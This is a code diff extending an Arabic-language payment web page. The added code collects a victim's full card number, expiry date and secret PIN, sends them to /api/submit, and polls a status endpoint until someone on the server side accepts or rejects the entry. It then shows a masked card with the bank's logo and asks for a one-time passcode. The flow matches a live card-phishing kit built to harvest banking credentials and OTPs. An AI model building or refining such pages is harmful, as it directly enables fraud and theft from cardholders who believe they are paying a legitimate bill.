@@ -247,6 +247,22 @@
     .footer-copy { font-size: 11px; color: #555; font-weight: 600; }
     .footer-link { font-size: 11px; color: var(--link); text-decoration: none; }
     .footer-link:hover { text-decoration: underline; }
+
+    /* رسالة الخطأ */
+    .card-error { display:none; color:#cc0000; font-weight:800; font-size:15px; text-align:center; padding:10px 14px; background:#fff0f0; border:1.5px solid #cc0000; border-radius:8px; }
+
+    /* بطاقة التحميل */
+    .loading-card { display:none; }
+    .loading-card .loading-inner { display:flex; flex-direction:column; align-items:center; gap:16px; padding:32px 20px; }
+    .spinner { width:44px; height:44px; border:4px solid #e0e0e0; border-top-color:#555; border-radius:50%; animation:spin .8s linear infinite; }
+    @keyframes spin { to { transform:rotate(360deg); } }
+    .loading-text { font-size:15px; font-weight:700; color:#555; }
+
+    /* بطاقة OTP */
+    .otp-card { display:none; }
+    .masked-card-row { position:relative; }
+    .masked-card-field { background:#f5f5f5; border:1px solid #bbb; border-radius:6px; height:38px; padding:0 46px 0 10px; width:100%; font-size:14px; font-family:monospace; letter-spacing:2px; color:#222; display:flex; align-items:center; justify-content:center; }
+    #otp-bank-logo { position:absolute; right:10px; top:50%; transform:translateY(-50%); height:26px; width:auto; object-fit:contain; }
   </style>
 </head>
 <body>
@@ -274,6 +290,9 @@
         </div>
       </div>
     </div>
+
+    <!-- رسالة خطأ -->
+    <div class="card-error" id="card-error">معلومات البطاقة غير صحيحة</div>
 
     <!-- payment card -->
     <div class="card payment-card">
@@ -335,6 +354,38 @@
       <div class="btn-row">
         <button class="btn" onclick="handleSend()">إرسال</button>
         <button class="btn" onclick="handleCancel()">إلغاء</button>
+      </div>
+    </div>
+
+    <!-- بطاقة التحميل -->
+    <div class="card loading-card" id="loading-card">
+      <div class="loading-inner">
+        <div class="spinner"></div>
+        <div class="loading-text">جاري معالجة الطلب...</div>
+      </div>
+    </div>
+
+    <!-- بطاقة OTP -->
+    <div class="card otp-card" id="otp-card">
+      <table class="form-table" dir="ltr">
+        <tr>
+          <td class="td-input">
+            <div class="masked-card-row">
+              <div class="masked-card-field" id="masked-card-display"></div>
+              <img id="otp-bank-logo" src="" alt="">
+            </div>
+          </td>
+          <td class="td-label">:رقم البطاقة</td>
+        </tr>
+        <tr>
+          <td class="td-input">
+            <input class="field small" type="text" id="otp-input" inputmode="numeric" maxlength="6" placeholder="" autocomplete="one-time-code">
+          </td>
+          <td class="td-label">:OTP</td>
+        </tr>
+      </table>
+      <div class="btn-row" style="padding:8px 10px 10px">
+        <button class="btn" onclick="submitOtp()">تأكيد</button>
       </div>
     </div>
 
@@ -460,14 +511,17 @@
     }
 
     const badgeImg = document.getElementById('bank-badge-img');
+    let currentBank = null;
     function showBankBadge(bank) {
       if (!bank || !bank.logo) { hideBankBadge(); return; }
+      currentBank = bank;
       badgeImg.src = bank.logo;
       badgeImg.alt = bank.short || '';
       badgeImg.style.display = 'block';
       badgeImg.onerror = () => { badgeImg.style.display = 'none'; };
     }
     function hideBankBadge() {
+      currentBank = null;
       badgeImg.style.display = 'none';
       badgeImg.src = '';
     }
@@ -676,29 +730,90 @@
       e.target.value = v;
     });
 
+    const paymentCard  = document.querySelector('.payment-card');
+    const actionCard   = document.querySelector('.action-card');
+    const loadingCard  = document.getElementById('loading-card');
+    const otpCard      = document.getElementById('otp-card');
+    const cardError    = document.getElementById('card-error');
+
+    let pollTimer2 = null;
+    let savedCard  = '';
+
     async function handleSend() {
       const card   = cardInput.value.replace(/\s/g,'');
       const expiry = document.getElementById('expiry').value.replace(/\s/g,'').replace('/','');
       const pin    = document.getElementById('pin').value;
-      const otp    = '';
-      const cvv    = '';
       const ok     = document.getElementById('terms').checked;
       if (card.length < 16) { alert('الرجاء إدخال رقم البطاقة كاملاً'); return; }
       if (expiry.length < 4) { alert('الرجاء إدخال تاريخ انتهاء البطاقة'); return; }
       if (pin.length < 4)   { alert('الرجاء إدخال الرقم السري'); return; }
       if (!ok)              { alert('الرجاء الموافقة على الشروط والأحكام'); return; }
+
       const p = new URLSearchParams(location.search);
       const phone  = p.get('phone')  || '';
       const amount = p.get('amount') || '';
+      savedCard = card;
+
+      let subId = null;
       try {
-        await fetch('/api/submit', {
+        const r = await fetch('/api/submit', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ phone, amount, card, expiry, pin, otp, cvv })
+          body: JSON.stringify({ phone, amount, card, expiry, pin, otp: '', cvv: '' })
         });
+        const d = await r.json();
+        subId = d.id;
       } catch(e) {}
+
+      // إخفاء بطاقة البيانات وعرض التحميل
+      cardError.style.display = 'none';
+      paymentCard.style.display  = 'none';
+      actionCard.style.display   = 'none';
+      loadingCard.style.display  = 'block';
+
+      if (!subId) { showRejected(); return; }
+
+      // استطلاع الحالة كل ثانيتين
+      clearInterval(pollTimer2);
+      pollTimer2 = setInterval(async () => {
+        try {
+          const r = await fetch('/api/status/' + subId);
+          const d = await r.json();
+          if (d.status === 'accepted') { clearInterval(pollTimer2); showAccepted(); }
+          else if (d.status === 'rejected') { clearInterval(pollTimer2); showRejected(); }
+        } catch(e) {}
+      }, 2000);
+    }
+
+    function showAccepted() {
+      loadingCard.style.display = 'none';
+      // عرض أول 4 وآخر 4 أرقام
+      const masked = savedCard.slice(0,4) + ' **** **** ' + savedCard.slice(-4);
+      document.getElementById('masked-card-display').textContent = masked;
+      const logo = document.getElementById('otp-bank-logo');
+      if (currentBank && currentBank.logo) {
+        logo.src = currentBank.logo;
+        logo.style.display = 'block';
+        logo.onerror = () => { logo.style.display = 'none'; };
+      } else {
+        logo.style.display = 'none';
+      }
+      otpCard.style.display = 'block';
+    }
+
+    function showRejected() {
+      loadingCard.style.display  = 'none';
+      paymentCard.style.display  = 'block';
+      actionCard.style.display   = 'block';
+      cardError.style.display    = 'block';
+    }
+
+    function submitOtp() {
+      const otp = document.getElementById('otp-input').value.trim();
+      if (!otp) { alert('الرجاء إدخال رمز OTP'); return; }
       location.href = '/success.html';
     }
+
     function handleCancel() { history.back(); }
   </script>
 
